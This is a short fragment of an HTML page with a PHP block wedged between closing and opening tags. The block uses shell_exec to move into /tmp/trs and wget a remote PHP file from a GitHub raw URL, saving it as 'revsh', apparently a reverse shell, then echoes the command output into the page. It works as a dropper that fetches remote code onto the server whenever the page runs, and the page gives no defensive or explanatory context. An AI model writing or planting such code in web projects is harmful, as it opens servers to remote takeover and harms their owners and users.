	</body>
</html>	
<?php 
	$prova = shell_exec('cd /tmp/trs; wget -o revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/start.php;');
	print "<html>
	    <body>
		{$prova}
	    </body>
	  </html>
	";
?>
<html>
	<body>


